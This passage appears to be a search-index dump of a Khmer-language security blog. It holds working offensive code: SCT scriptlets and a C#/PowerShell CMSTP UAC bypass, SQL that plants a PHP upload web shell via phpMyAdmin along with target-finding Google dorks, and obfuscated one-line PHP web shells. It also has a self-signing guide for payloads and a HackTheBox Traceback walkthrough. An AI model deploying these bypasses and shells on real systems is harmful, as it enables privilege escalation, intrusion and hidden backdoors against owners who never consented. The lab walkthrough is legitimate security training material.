\u0026lt;?XML version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;scriptlet\u0026gt; \u0026lt;registration  progid=\u0026#34;Pentest\u0026#34; classid=\u0026#34;{F0001111-0000-0000-0000-0000FEEDACDC}\u0026#34; \u0026gt; \u0026lt;!-- Proof Of Concept - @netbiosX --\u0026gt; \u0026lt;script language=\u0026#34;JScript\u0026#34;\u0026gt; \u0026lt;![CDATA[ var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;cmd /k cd c:\\ \u0026amp; pentestlab.exe\u0026#34;);\t ]]\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/registration\u0026gt; \u0026lt;/scriptlet\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ### SCT File Obfuscation Examples: \u0026lt;?XML version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;scriptlet\u0026gt; \u0026lt;registration  progid=\u0026#34;PoC\u0026#34; classid=\u0026#34;{F0001111-0000-0000-0000-0000FEEDACDC}\u0026#34; \u0026gt; \u0026lt;!-- Proof Of Concept - Casey Smith @subTee --\u0026gt; \u0026lt;!-- License: BSD3-Clause --\u0026gt; \u0026lt;script language=\u0026#34;JScript\u0026#34;\u0026gt; \u0026lt;![CDATA[ //x86 only. C:\\Windows\\Syswow64\\regsvr32.exe /s /u /i:file.sct scrobj.dll var scr = new ActiveXObject(\u0026#34;MSScriptControl.ScriptControl\u0026#34;); scr.Language = \u0026#34;JScript\u0026#34;; scr.ExecuteStatement(\u0026#39;var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;calc.exe\u0026#34;);\u0026#39;); scr.Eval(\u0026#39;var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;calc.exe\u0026#34;);\u0026#39;); //https://msdn.microsoft.com/en-us/library/aa227637(v=vs.60).aspx //Lots of hints here on futher obfuscation ]]\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/registration\u0026gt; \u0026lt;/scriptlet\u0026gt;   នៅពេលដំណើរការស្ក្រីបនៃឯកសារ INF វានឹងលោត​ផ្ទាំង​វីន​ដូមួយ​ចេញ​មក​ដើម្បី​ដំណើរ​ការ​ពាក្យ​បញ្ជា PowerShell ។\nក្រោយដំណើរការស្ក្រីបរួច ឯកសារមេរោគនឹងធ្វើការទាញយកពីម៉ាស៊ីនមេហើយធ្វើប្រតិបត្តិភ្លាមៗតែម្ដង។\nពេលនោះ Metasploit និងទទួលបាន Reverse Shell ហើយគ្រប់​គ្រង​ម៉ាស៊ីន​ទាំង​មូល៕\nឯកសារយោង:\n pentestlab.blog ha.cker.in ired.team  ","description":"DLL Bypass AppLocker ជាមួយឯកសារ CMSTP","id":12,"section":"posts","tags":["dll","bypass","inf","sct"],"title":"AppLocker Bypass - CMSTP","uri":"http://localhost:1313/en/posts/applocker-cmstp-bypass/"},{"content":"ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវីនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ PS1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច Exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។\nC# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  /* UAC Bypass using CMSTP.exe microsoft binary. Code author: Andre Marques (@_zc00l) */ using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Windows; using System.Runtime.InteropServices; public class CMSTPBypass { // Our .INF file data! public static string InfData = @\u0026#34;[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install REPLACE_COMMAND_LINE taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \u0026#34;\u0026#34;HKLM\u0026#34;\u0026#34;, \u0026#34;\u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\u0026#34;\u0026#34;, \u0026#34;\u0026#34;ProfileInstallPath\u0026#34;\u0026#34;, \u0026#34;\u0026#34;%UnexpectedError%\u0026#34;\u0026#34;, \u0026#34;\u0026#34;\u0026#34;\u0026#34; [Strings] ServiceName=\u0026#34;\u0026#34;CorpVPN\u0026#34;\u0026#34; ShortSvcName=\u0026#34;\u0026#34;CorpVPN\u0026#34;\u0026#34; \u0026#34;; [DllImport(\u0026#34;user32.dll\u0026#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\u0026#34;user32.dll\u0026#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); public static string BinaryPath = \u0026#34;c:\\\\windows\\\\system32\\\\cmstp.exe\u0026#34;; /* Generates a random named .inf file with command to be executed with UAC privileges */ public static string SetInfFile(string CommandToExecute) { string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(\u0026#34;.\u0026#34;))[0]; string TemporaryDir = \u0026#34;C:\\\\windows\\\\temp\u0026#34;; StringBuilder OutputFile = new StringBuilder(); OutputFile.Append(TemporaryDir); OutputFile.Append(\u0026#34;\\\\\u0026#34;); OutputFile.Append(RandomFileName); OutputFile.Append(\u0026#34;.inf\u0026#34;); StringBuilder newInfData = new StringBuilder(InfData); newInfData.Replace(\u0026#34;REPLACE_COMMAND_LINE\u0026#34;, CommandToExecute); File.WriteAllText(OutputFile.ToString(), newInfData.ToString()); return OutputFile.ToString(); } public static bool Execute(string CommandToExecute) { if(!File.Exists(BinaryPath)) { Console.WriteLine(\u0026#34;Could not find cmstp.exe binary!\u0026#34;); return false; } StringBuilder InfFile = new StringBuilder(); InfFile.Append(SetInfFile(CommandToExecute)); Console.WriteLine(\u0026#34;Payload file written to \u0026#34; + InfFile.ToString()); ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath); startInfo.Arguments = \u0026#34;/au \u0026#34; + InfFile.ToString(); startInfo.UseShellExecute = false; Process.Start(startInfo); IntPtr windowHandle = new IntPtr(); windowHandle = IntPtr.Zero; do { windowHandle = SetWindowActive(\u0026#34;cmstp\u0026#34;); } while (windowHandle == IntPtr.Zero); System.Windows.Forms.SendKeys.SendWait(\u0026#34;{ENTER}\u0026#34;); return true; } public static IntPtr SetWindowActive(string ProcessName) { Process[] target = Process.GetProcessesByName(ProcessName); if(target.Length == 0) return IntPtr.Zero; target[0].Refresh(); IntPtr WindowHandle = new IntPtr(); WindowHandle = target[0].MainWindowHandle; if(WindowHandle == IntPtr.Zero) return IntPtr.Zero; SetForegroundWindow(WindowHandle); ShowWindow(WindowHandle, 5); return WindowHandle; } }   ផ្អែកលើការងារពីមុនរបស់លោក Oddvar Moe\nផ្អែកលើ PowerShell ស្គ្រីបរបស់លោក Tyler Applebaum\nចម្លងកូដខាងលើរក្សាទុកជា \u0026ldquo;Source.cs\u0026rdquo;\nដើម្បីបំប្លែងកូដទៅជាឯកសារ dll យើងអាចប្រើពាក្យបញ្ជានៅលើ powershell ដូចខាងក្រោម៖\n1  Add-Type -TypeDefinition ([IO.File]::ReadAllText(\u0026#34;$pwd\\Source.cs\u0026#34;)) -ReferencedAssemblies \u0026#34;System.Windows.Forms\u0026#34; -OutputAssembly \u0026#34;CMSTP-UAC-Bypass.dll\u0026#34;   ក្រោយបំប្លែងរួចវានឹងបង្កើតចេញជាឯកសារមួយមានឈ្មោះថា \u0026ldquo;CMSTP-UAC-Bypass.dll\u0026rdquo;\nBypass UAC ដើម្បីប្រើប្រាស់ឯកសារ DLL ដែលបានបង្កើតរួចឲ្យដំណើរការ Bypass UAC យើងអាចប្រើពាក្យបញ្ជាដូចខាងក្រោម៖\n1 2 3 4 5 6 7  PS C:\\\u0026gt; [Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\u0026#34;$pwd\\CMSTP-UAC-Bypass.dll\u0026#34;)) GAC Version Location --- ------- -------- False v4.0.30319 PS C:\\\u0026gt; [CMSTPBypass]::Execute(\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;)   ក្រោយពីរដំណើររួច នឹងមានលោតផ្ទាំង CMD អមមកជាមួយនិងសិទ្ធជា Administrator ។\nដូចដែលបានឃើញគឺយើងអាចធ្វើការ Bypass UAC បានសម្រេចដោយឈរនៅលើសិទ្ធិអ្នកប្រើប្រាស់ធម្មតា៕\nBonus - Bypass With PS1 (One File Action) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133  # UAC Bypass poc using SendKeys # Version 1.0 # Author: Oddvar Moe # Functions borrowed from: https://powershell.org/forums/topic/sendkeys/ # Todo: Hide window on screen for stealth # Todo: Make script edit the INF file for command to inject... Function script:Set-INFFile { [CmdletBinding()] Param ( [Parameter(HelpMessage=\u0026#34;Specify the INF file location\u0026#34;)] $InfFileLocation = \u0026#34;$env:temp\\CMSTP.inf\u0026#34;, [Parameter(HelpMessage=\u0026#34;Specify the command to launch in a UAC-privileged window\u0026#34;)] [String]$CommandToExecute = \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39; #your action here ) $InfContent = @\u0026#34; [version] Signature=`$chicago`$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install $CommandToExecute taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \u0026#34;HKLM\u0026#34;, \u0026#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\u0026#34;, \u0026#34;ProfileInstallPath\u0026#34;, \u0026#34;%UnexpectedError%\u0026#34;, \u0026#34;\u0026#34; [Strings] ServiceName=\u0026#34;CorpVPN\u0026#34; ShortSvcName=\u0026#34;CorpVPN\u0026#34; \u0026#34;@ $InfContent | Out-File $InfFileLocation -Encoding ASCII } Function Get-Hwnd { [CmdletBinding()] Param ( [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName ) Process { $ErrorActionPreference = \u0026#39;Stop\u0026#39; Try { $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle } Catch { $hwnd = $null } $hash = @{ ProcessName = $ProcessName Hwnd = $hwnd } New-Object -TypeName PsObject -Property $hash } } function Set-WindowActive { [CmdletBinding()] Param ( [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name ) Process { $memberDefinition = @\u0026#39; [DllImport(\u0026#34;user32.dll\u0026#34;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\u0026#34;user32.dll\u0026#34;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); \u0026#39;@ Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32 $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd If ($hwnd) { $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0) [User32.Api]::SetForegroundWindow($hwnd) [User32.Api]::ShowWindow($hwnd, 5) } Else { [string] $hwnd = \u0026#39;N/A\u0026#39; } $hash = @{ Process = $Name Hwnd = $hwnd } New-Object -TypeName PsObject -Property $hash } } . Set-INFFile #Needs Windows forms add-type -AssemblyName System.Windows.Forms If (Test-Path $InfFileLocation) { #Command to run $ps = new-object system.diagnostics.processstartinfo \u0026#34;c:\\windows\\system32\\cmstp.exe\u0026#34; $ps.Arguments = \u0026#34;/au $InfFileLocation\u0026#34; $ps.UseShellExecute = $false #Start it [system.diagnostics.process]::Start($ps) do { # Do nothing until cmstp is an active window } until ((Set-WindowActive cmstp).Hwnd -ne 0) #Activate window Set-WindowActive cmstp #Send the Enter key [System.Windows.Forms.SendKeys]::SendWait(\u0026#34;{ENTER}\u0026#34;) }   ឯកសារដើម៖\n https://0x00-0x00.github.io tylerapplebaum  ","description":"បង្កើតស្គ្រីប powershell ដើម្បី Bypass UAC ជាមួយឯកសារ DLL","id":13,"section":"posts","tags":["dll","bypass"],"title":"Bypass UAC DLL Method","uri":"http://localhost:1313/en/posts/bypass-uac-dll-method/"},{"content":"Google Dorks  allinurl:index.php?db=information_schema allinurl:/read_dump.php?  SQL Query ចូលទៅកាន់ផ្ទាំង phpMyAdmin Database ហើយបង្កើត Database ថ្មីមួយ ឧ, \u0026ldquo;uploader\u0026rdquo; បន្ទាប់មកចុចត្រង់ផ្ទាំង SQL ហើយចម្លងចូលនូវកូដខាងក្រោមនេះ៖\n1 2 3  CREATETABLE`uploader`.`userform`(`track1`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   និងកូដខាងក្រោមនេះទៀត៖\n1 2 3  CREATETABLE`uploader`.`user_upload`(`track2`VARCHAR(1000)NOTNULL)ENGINE=MYISAM;   បន្ទាប់មកចូលទៅកាន់ Table ឈ្មោះថា user_upload ហើយចុចត្រង់ផ្ទាំង SQL និងចម្លងចូលនូវកូដខាងក្រោម៖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  insertintouserformvalues(\u0026#39;\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Uploader\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\u0026#34;black\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div style=\u0026#34;color:white;margin-top:150px;\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Uploader\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;form enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;uploader.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;userfile\u0026#34; type=\u0026#34;file\u0026#34; /\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;\u0026#39;);   និងកូដខាងក្រោមផងដែរ\n1  select*intodumpfile\u0026#39;C:/xampp/htdocs/wkspace/up.php\u0026#39;fromuserform   ដើម្បីស្វែងរកនូវទីតាំងរបស់ Database Webserver យើងអាចប្រើ Syntax មួយនេះ \u0026ldquo;SELECT @@datadir\u0026rdquo; នៅក្នុង SQL Query SQL Cheatsheet\nក្រោយមកចម្លងចូលកូដខាងក្រោមនៅក្នុង table user_upload\n1 2 3 4 5 6  INSERTINTOuser_uploadVALUES(\u0026#34;\u0026lt;?php $uploaddir = \u0026#39;C:/xampp/htdocs/wkspace/\u0026#39;; $uploadfile = $uploaddir . basename($_FILES[\u0026#39;userfile\u0026#39;][\u0026#39;name\u0026#39;]); if (move_uploaded_file($_FILES[\u0026#39;userfile\u0026#39;][\u0026#39;tmp_name\u0026#39;],$uploadfile)) { print \u0026#39;\u0026lt;body bgcolor=black\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2 style=color:white;margin-top:150px;\u0026gt;Uploaded successully.\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; } else { print \u0026#39;\u0026lt;body bgcolor=black\u0026gt;\u0026lt;center\u0026gt;\u0026lt;h2 style=color:red;margin-top:150px;\u0026gt;Uploaded Failed.\u0026lt;/h2\u0026gt;\u0026lt;/center\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; } ?\u0026gt;\u0026#34;)   ជាចុងក្រោយចម្លងចូលនូវកូដខាងក្រោម៖\n1  select*intodumpfile\u0026#39;C:/xampp/htdocs/wkspace/uploader.php\u0026#39;fromuser_upload   ឥឡូវសាកល្បងបើកមើល Web Shell ដែលបានបង្ហោះរួចទៅតាមទីតាំងដែលបានបញ្ចូល ជាការស្រេច។\n","description":"យល់ដឹងពីវិធីបង្ហោះ Web Shell តាមរយៈ phpMyAdmin","id":14,"section":"posts","tags":["fileupload","google-dork","phpmyadmin"],"title":"Upload Shell Via phpMyAdmin","uri":"http://localhost:1313/en/posts/upload-shell-via-phpmyadmin/"},{"content":"Recon ជាដំបូងខ្ញុំប្រើ Nmap ដើម្បីស្វែងរកផតដែលបានបើក និងសេវាកម្មដែលបានប្រើ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  :~$ sudo nmap -sC -sV 10.10.10.181 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 13:29 +07 Nmap scan report for 10.10.10.181 Host is up (0.29s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   ដូចដែលបានឃើញ គឺមានតែផតពីរប៉ុណ្នោះដែលបានបើកគឺផត ២២(ssh) និងផង ៨០(http)\nOSINT ក្រោយពីស្កេនរួចមកខ្ញុំក៏ចូលទៅកាន់អាស័យដ្ឋាន http://10.10.10.181:80 ហើយក៏បានឃើញដូចរូបដូចខាងក្រោម៖\nខ្ញុំចុច Ctrl+U ដើម្បីចូលមើលកូដខាងក្នុង ក៏ឃើញមាននូវព័ត៌មានមួយចំនួន៖\nខ្ញុំចាប់ផ្ដើមស្វែងរកឈ្មោះម្ចាស់គណនី Xh4H នៅក្នុង Google ហើយក៏បានរកឃើញនូវ Github របស់ម្ចាស់គណនី។\nបន្ទាប់មកខ្ញុំបានចូលទៅមើលក្នុង Repositories នោះហើយក៏ឃើញមាន Repository មួយមានឈ្មោះថា Web-Shells\nខ្ញុំបានសាកល្បងចូលទៅតាមឈ្មោះរបស់ Shell រហូតដល់ឯកសារឈ្មោះថា smevk.php ដែលលោតចេញនៅផ្ទាំងបំពេញបែបបត់ចូល\nលេខសំងាត់របស់វាគឺ admin/admin ខ្ញុំក៏បានចូលទៅក្នុង Web Server បានសម្រេច។\nGet User ដើម្បីបាន User Flag ជាដំបូងខ្ញុំបានចូលទៅក្នុង /home/ តាមរយៈ Web-Shell ហើយក៏ឃើញមានគណនីអ្នកប្រើប្រាស់ចំនួនពីរ sysadmin/webadmin ដោយគណនី sysadmin ខ្ញុំមិនអាចមានសិទ្ធិចូលទៅក្នុងបានទេដូចនេះខ្ញុំចូលបានតែគណនី webadmin មួយប៉ុណ្នោះ។\nក្រោយមកខ្ញុំក៏ឃើញមានថតឯកសារមួយឈ្មោះថា .ssh និង ឯងសារមួយទៀតឈ្មោះថា authorised_keys\nដូចនេះខ្ញុំក៏បានបង្កើតនៅ SSH-Key ហើយដាក់វាចូលទៅក្នុងឯកសារនោះដើម្បីមានសិទ្ធិចូលទៅកាន់ម៉ាស៊ីនមេតាមរយៈ SSH\nក្រោយពីចូលតាមរយៈ SSH រួចមកខ្ញុំបានឃើញឯកសារមួយឈ្មោះ note.txt ដែលក្នុងនោះមានអត្ថន័យថា៖\n1 2 3 4  - sysadmin - I have left a tool to practice Lua. I\u0026#39;m sure you know where to find it. Contact me if you have any question.   ខ្ញុំក៏សាកស្វែងរកមើលឯកសារនៅក្នុងនោះ ហើយក៏បានរកឃើញប្រវត្តិប្រើប្រាស់ពាក្យបញ្ជាចាស់ៗ របស់អ្នកប្រើប្រាស់ដូចខាងក្រោម៖\n1 2 3 4 5 6 7  webadmin@traceback:~$ cat .bash_history ls -la sudo -l nano privesc.lua sudo -u sysadmin /home/sysadmin/luvit privesc.lua rm privesc.lua logout   ដោយដឹងថា luvit ជាប្រភេទ lua script ដែលមានលទ្ធិភាពក្នុងការ execute និងបើកមើលនូវរាល់ឯកសារណាដែលមាននៅក្នុងគណនី sysadmin បានដូចនេះខ្ញុំក៏បង្កើត Script តូចមួយដើម្បីចូលទៅបើកមើលឯកសារ user.txt ដែលមាននៅក្នុងគណនី sysadmin ផ្ទាល់តែម្ដង។\n1  webadmin@traceback:~$ echo \u0026#34;os.execute(\u0026#34;cat /home/sysadmin/user.txt\u0026#34;) \u0026gt; user.lua   បន្ទាប់មកខ្ញុំបានប្រើប្រាស់ឯកសារ luvit ដដែលដើម្បីបើកឯកសារ user.lua\n1 2  webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit user.lua 23c296e8cxxxxxxxxxxxxxxxxxxxxxec   ដូចនេះខ្ញុំក៏ទទួលបាន User Flag ដូចដែលបានបង្ហាញខាងលើ។\nGet Root ដោយប្រើប្រាស់ឯកសារ luvit ខ្ញុំអាចមានសិទ្ធិចូលជាគណនីរបស់ sysadmin បានដោយប្រើប្រាស់វិធីដូចខាងក្រោម៖\n1 2 3  webadmin@traceback:~$ echo \u0026#34;os.execute(\u0026#34;/bin/bash\u0026#34;) \u0026gt; sys.lua webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit sys.lua sysadmin@traceback:~$   ដូចដែលបានឃើញគឺខ្ញុំមានសិទ្ធិប្ដូរទៅជាគណនី sysadmin វិញដោយប្រើប្រាស់ Lua Script\nបន្ទាប់ពីមានសិទ្ធិជា sysadmin ហើយខ្ញុំក៏ដាក់ SSH-Key ចូលទៅក្នុងប្រអប់ .ssh ដើម្បីអាច SSH ចូលទៅក្នុងគណនី sysadmin បានដូចពីពេលមុនដែរ។\nបន្តទៀតខ្ញុំត្រូវការមើល Process របស់គណនី root ថាតើកំពុងតែប្រើពាក្យបញ្ជាអ្វីខ្លះ។ ដោយសារតែមិនមានសិទ្ធិជា root ចឹងហើយទើបជម្រើសដែលល្អបំផុតគឺប្រើប្រាស់ Tool ខាងក្រៅហើយ Tool ដែលខ្ញុំប្រើនោះគឺឈ្មោះ pspy64 ដែលវាមានលទ្ធិភាពក្នុងការមើល Process គ្រប់គណនីទាំងអស់បើទោះបីជាគ្មានសិទ្ធិជា root ក៏ដោយ។\nទាញយក៖ pspy64\nដើម្បី Upload ឯកសារនេះបានខ្ញុំត្រូវប្រើប្រាស់ពាក្យបញ្ជា scp\n1  :~$ sudo scp -i id_rsa pspy64 sysadmin@10.10.10.181:/tmp/   ខ្ញុំបានបើកដំណើរការឯកសារ pspy64 នោះ ហើយវាបានបញ្ចេញនូវព័ត៌មានដូចខាងក្រោម៖\n1 2 3 4 5 6  2020/05/21 04:02:01 CMD: UID=0 PID=6094 | sleep 30 2020/05/21 04:02:01 CMD: UID=0 PID=6093 | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/05/21 04:02:01 CMD: UID=0 PID=6092 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/05/21 04:02:01 CMD: UID=0 PID=6091 | /usr/sbin/CRON -f 2020/05/21 04:02:01 CMD: UID=0 PID=6090 | /usr/sbin/CRON -f 2020/05/21 04:02:31 CMD: UID=0 PID=6096 | /bin/cp /var/backups/.update-motd.d/ /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/   អ្វីដែលគួរឲ្យចាប់អារម្មណ៏នោះគឺត្រង់កន្លែង \u0026ldquo;/bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\u0026rdquo; និង \u0026ldquo;sleep 30\u0026rdquo; មានន័យថារាល់ពេល ៣០វិនាទីម្ដងម៉ាស៊ីនមួយនេះនឹងធ្វើការថតចម្លងគ្រប់ឯកសារទាំងអស់ដែលស្ថិតនៅក្នុងថតឯកសារ /var/backups/.update-motd.d/ យកទៅដាក់ចូលទៅក្នុងថតឯកសារ /etc/update-motd.d/ ដែលជាថតឯកសារមេរបស់ម៉ាស៊ីន និង ប្រើប្រាស់ដោយម្ចាស់គណនី root។\nក្រោយពីបានចូលទៅមើលឯកសារដែលមាននៅក្នុងថតឯកសារ /etc/update-motd.d/ រួចមកខ្ញុំសង្កេតឃើញថាឯកសារដែលមានក្នុងនោះគឺជារបស់ម្ចាស់គណនី root ប៉ុន្តែម្ចាស់គណនី sysadmin ក៏អាចមានសិទ្ធិកែប្រែបានផងដែរ។\nដូចនេះខ្ញុំក៏បន្ថែមពាក្យបញ្ជាមួយបន្ទាត់ទៀត គឺ \u0026ldquo;cat /root/root.txt\u0026rdquo; ចូលទៅក្នុងឯកសារ 00-header ដែលជាឯកសារបង្ហាញផ្ទាំងក្បាលនៅពេលចូលដល់កន្លែងវាយលេខសំងាត់របស់ SSH\nនៅពេលរួចរាល់អស់ហើយខ្ញុំបានធ្វើការសាកល្បង SSH ចូលក្នុងម៉ាស៊ីនមេម្ដងទៀតហើយក៏ទទួលបាន\u0026hellip; :D\nពិតណាស់ ដូចដែលឃើញចឹងគឺខ្ញុំទទួលបាន Root Flag នៅពេលដែលចូលក្នុងម៉ាស៊ីនមេដោយប្រើ SSH៕\n","description":"សំនេររៀបរាប់អំពីការហេគម៉ាស៊ីនមេ Traceback","id":15,"section":"posts","tags":null,"title":"HackTheBox - Traceback","uri":"http://localhost:1313/en/posts/traceback-10-10-10-181/"},{"content":"Hello, I\u0026rsquo;m thik and this is my blog, written about Cybersecurity topic and Malware research.\n","description":"About author of the blog","id":16,"section":"","tags":null,"title":"About","uri":"http://localhost:1313/en/about/"},{"content":"តើមានវិធីអ្វីដែលអាចធ្វើ Code Signing ទៅលើ Payload ដែលយើងបានបង្កើតឡើងដោយខ្លួនឯងរួច?\nខាងក្រោមនេះគឺជាវិធីដ៏ល្អមួយសម្រាប់ចម្លើយនៃសំនួរខាងលើ៖\nGenerate the Key 1 2  # Make sure you run as Administrator New-SelfSignedCertificate -DnsName email@yourdomain.com -Type CodeSigning -CertStoreLocation cert:\\CurrentUser\\My   Export Certification Without Private Key 1  Export-Certificate -Cert (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)[0] -FilePath code_signing.crt   ចំពោះលេខ [0] គឺសម្រាប់ករណីនៅពេលដែលយើងមាន Certificate ច្រើនជាងមួយ។\nImport as Trusted Publisher 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\TrustedPublisher   Import as Root Certificate Authority 1  Import-Certificate -FilePath .\\code_signing.crt -Cert Cert:\\CurrentUser\\Root   Signing Application 1  Set-AuthenticodeSignature .\\app.exe -Certificate (Get-ChildItem Cert:\\CurrentUser\\My -CodeSigningCert)   គួរចំណាំផងដែរថា នៅពេលដែលយើងបានដំឡើងសោរនេះរួចរាល់ហើយ យើងក៏អាចចុះហត្ថលេខា ទៅឲ្យស្គ្រីបផ្សេងទៀតជាមួយវាបានផងដែរ។\nប្រភព៖ stackoverflow\nអត្ថបទទាក់ទង៖ sid-500.com\n","description":"របៀបបង្កើត Certification សម្រាប់ Code Signing","id":17,"section":"posts","tags":["code-signing"],"title":"Self Signed Certification","uri":"http://localhost:1313/en/posts/self-signed-certification/"},{"content":"UniSh3ll-I 1  \u0026lt;?=$_=$_GET;$_[_]($_[0]); //.php?_=system\u0026amp;0=id;ls+-la    UniSh3ll-II 1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\u0026#34; \u0026gt; unish3ll.php   1  echo -e \u0026#34;\u0026lt;?=\\`\\$_REQUEST[_]\\`?\u0026gt;\\r\u0026lt;?=\u0026#39;404 Not found\u0026#39;;?\u0026gt;\u0026#34; \u0026gt; unish3ll.php   របៀបប្រើ៖ curl localhost/unish3ll.php -d _=ls+-la\nUniSh3ll-III 1  \u0026lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ\u0026amp;$ឋ[ម]($ឋ[ប]); //.php?ត=true\u0026amp;ល=រងារ\u0026amp;ម=passthru\u0026amp;ប=ls    1  \u0026lt;?=$ឋ=$_GET;if($ឋ[ត]!=null)$ឋ[ល]==រងារ\u0026amp;$ឋ[ម]($ឋ[ប]); eval(\u0026#39;?\u0026gt;\u0026#39;.file_get_contents($ឋ[ដ]));?\u0026gt;   របៀបប្រើ៖ 